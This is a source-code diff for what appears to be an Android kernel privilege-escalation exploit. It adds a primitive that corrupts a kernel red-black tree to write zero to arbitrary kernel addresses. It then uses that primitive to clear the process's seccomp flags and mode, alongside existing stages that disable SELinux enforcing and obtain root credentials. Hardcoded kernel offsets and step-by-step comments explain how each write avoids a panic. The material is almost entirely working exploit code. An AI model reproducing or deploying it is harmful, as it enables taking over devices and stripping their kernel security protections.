@@ -61,6 +61,8 @@ static void eqs_raw_emit(const char *fmt, ...) {
  * base is 0xffffffc008000000, so e.g. 0xffffffc00aa85000 - base == 0x02a85000. */
 #define EQS_OFF_PER_CPU_OFFSET 0x0278a558ULL /* __per_cpu_offset[] */
 #define EQS_OFF_ENTRY_TASK     0x027562f8ULL /* per-cpu __entry_task */
+/* thread_info.flags word of a task (CONFIG_THREAD_INFO_IN_TASK => task+0). */
+#define EQS_TASK_THREAD_INFO_FLAGS_OFF 0x0
 /* byte0==0 alias used to disable SELinux enforcing (selinux_state+0 is a bool),
  * standalone eqs target.h SLIDE_SELINUX_ZERO_VALUE_IMAGE = ..c00aa85000. */
 #define EQS_SELINUX_ZERO_IMAGE_OFF 0x02a85000ULL
@@ -503,6 +505,16 @@ static int eqs_fork_op(int override, int shape, uintptr_t target,
         slide_override_w0 = value;
         slide_override_w1 = 0;
         slide_override_w2 = target;
+      } else if (shape == 2) {
+        /* ZERO WRITE (see slide_eqs_zero_write): rb_left = rb_right = 0 takes
+         * __rb_erase_augmented()'s no-child path with pc = target-8 (8-aligned,
+         * so rb_is_black(pc) == 0 => rebalance == NULL, no color fixup).
+         * __rb_change_child() reads parent->rb_left == *(target+8) and, since
+         * that is never &waiter->tree_entry, stores parent->rb_right = NULL at
+         * parent+8 == target. One store, no A+8 dereference. */
+        slide_override_w0 = target - 8;
+        slide_override_w1 = 0;
+        slide_override_w2 = 0;
       } else {
         /* rb_left = 0, rb_right = value */
         slide_override_w0 = target - 8;
@@ -681,6 +693,76 @@ static int eqs_write64(uintptr_t target, uintptr_t value, const char *name,
   return 0;
 }
 
+/* Shape-2 ZERO write: *(target) = 0 with a single kernel store and no
+ * collateral (see the shape==2 overlay comment in eqs_fork_op). Required for
+ * seccomp clearing, where the value must be 0 and shape 0 cannot express it
+ * (its collateral would dereference A+8 == 8). target must be 8-byte aligned
+ * and writable, and target+8 readable. */
+int slide_eqs_zero_write(uintptr_t target, const char *name, int *idx) {
+  if ((target & 7) != 0) {
+    pr_error("eqs-zero precheck name=%s target=%016zx not 8-aligned\n", name,
+             target);
+    return 0;
+  }
+  for (int attempt = 1; attempt <= EQS_WRITE_ATTEMPTS; attempt++) {
+    int slot = (*idx)++;
+    struct eqs_op_result r;
+    int ok = eqs_fork_op(1, 2, target, 0, slot, &r);
+    pr_success("eqs-zerowrite name=%s attempt=%d slot=%d target=%016zx ok=%d "
+               "armed=%d sched_ok=%d pselect=%d/%d sigalrm=%d setprio=%d "
+               "pkill=%d\n",
+               name, attempt, slot, target, ok, r.armed, r.sched_ok,
+               r.pselect_ret, r.pselect_errno, r.sigalrm, r.setprio_ret,
+               r.pthread_kill_ret);
+    if (ok) {
+      return 1;
+    }
+  }
+  return 0;
+}
+
+/* Self-contained, non-vacuous proof of shape 2:
+ *   1. shape 0 puts a known NON-ZERO value (the address of a second scratch
+ *      slot) at `scratch`;
+ *   2. the read primitive reads it back (must equal the seed);
+ *   3. shape 2 zero-writes `scratch`;
+ *   4. the read primitive reads it back again (must be 0).
+ * Both scratch slots are ordinary fresh slots from the zero pool, so this needs
+ * no KASLR base and no root. GHOSTLOCK_ZERO_TEST=1 runs only this. */
+int slide_eqs_zero_selftest(void) {
+  eqs_init_slot_rotation();
+  int idx = eqs_next_slot_idx;
+  uintptr_t scratch = slide_zero_slot(idx++);
+  uintptr_t seed = slide_zero_slot(idx++);
+  eqs_next_slot_idx = idx;
+  pr_info("eqs-zero-selftest scratch=%016zx seed=%016zx\n", scratch, seed);
+
+  uint64_t pre = 0;
+  uint64_t post = 0xdeadbeefdeadbeefULL;
+  int ok = 0;
+  do {
+    if (!eqs_write64(scratch, seed, "zerotest_seed", &idx)) {
+      break;
+    }
+    if (!eqs_read64(scratch, &pre, "zerotest_pre", &idx)) {
+      break;
+    }
+    if (!slide_eqs_zero_write(scratch, "zerotest_zero", &idx)) {
+      break;
+    }
+    if (!eqs_read64(scratch, &post, "zerotest_post", &idx)) {
+      break;
+    }
+    ok = (pre == (uint64_t)seed) && (post == 0);
+  } while (0);
+
+  eqs_raw_emit("[+] eqs-zero-selftest ok=%d pre=%016llx expected_seed=%016llx "
+               "post=%016llx\n",
+               ok, (unsigned long long)pre, (unsigned long long)seed,
+               (unsigned long long)post);
+  return ok;
+}
+
 uint64_t slide_read_stext(void) {
   int slot = eqs_next_slot_idx++;
   if (!eqs_fork_op(1, 0, SLIDE_RANDOM_BOOT_ID_DATA, SLIDE_LOGGERS_0_1, slot,
@@ -742,6 +824,55 @@ static int eqs_read_enforcing(void) {
     return 1;
   }
   return -1;
+}
+
+/* Seccomp filter present in this process? (zygote/app flow: yes; adb/shell: no).
+ * Only then is it worth zeroing thread_info.flags/seccomp.mode. */
+static int eqs_process_has_seccomp(void) {
+  FILE *f = fopen("/proc/self/status", "r");
+  if (!f) {
+    return 0;
+  }
+  char line[256];
+  int seccomp = 0;
+  while (fgets(line, sizeof(line), f)) {
+    if (strncmp(line, "Seccomp:", 8) == 0) {
+      seccomp = atoi(line + 8);
+      break;
+    }
+  }
+  fclose(f);
+  return seccomp != 0;
+}
+
+/* Clear this task's seccomp filter so forked workers (the root script / ksud
+ * chain) run filter-free. Order matters:
+ *   1. thread_info.flags (task+0): clearing TIF_SECCOMP makes secure_computing()
+ *      short-circuit, so __secure_computing() is never entered while mode is
+ *      still stale.
+ *   2. seccomp.mode (task+TASK_SECCOMP_OFF = 0x848): mode 0 makes copy_process()
+ *      stop re-arming TIF_SECCOMP for children.
+ * Clearing mode first (or alone) would send the next syscall into
+ * __secure_computing()'s default case, which is BUG()/WARN_ON(1) -> panic on
+ * this device. Both stores are shape-2 zero writes. */
+static int eqs_clear_seccomp(uintptr_t task, int *idx) {
+  if (!eqs_process_has_seccomp()) {
+    pr_success("eqs stage-2 no seccomp filter; skipping the W3 clear\n");
+    return 1;
+  }
+  pr_success("eqs stage-2 clearing seccomp flags=%016zx mode=%016zx\n",
+             task + EQS_TASK_THREAD_INFO_FLAGS_OFF,
+             task + TASK_SECCOMP_OFF);
+  if (!slide_eqs_zero_write(task + EQS_TASK_THREAD_INFO_FLAGS_OFF,
+                            "seccomp_flags", idx)) {
+    pr_error("eqs stage-2 TIF_SECCOMP clear failed\n");
+    return 0;
+  }
+  if (!slide_eqs_zero_write(task + TASK_SECCOMP_OFF, "seccomp_mode", idx)) {
+    pr_error("eqs stage-2 seccomp.mode clear failed\n");
+    return 0;
+  }
+  return 1;
 }
 
 /* Highest ONLINE CPU of the system (not of the task's affinity mask: run_exploit
@@ -895,6 +1026,10 @@ int slide_eqs_root_stage(void) {
       pr_warning("eqs stage-2 selinux_zero primitive failed\n");
     }
   }
+
+  /* W3 equivalent: clear this task's seccomp filter with shape-2 zero writes
+   * (only when a filter is actually present; the adb/shell flow has none). */
+  eqs_clear_seccomp((uintptr_t)task, &idx);
 
   pr_success("eqs-stage2-summary task=%016llx init_cred=%016zx selinux=%d->%d "
              "uid=%u euid=%u\n",
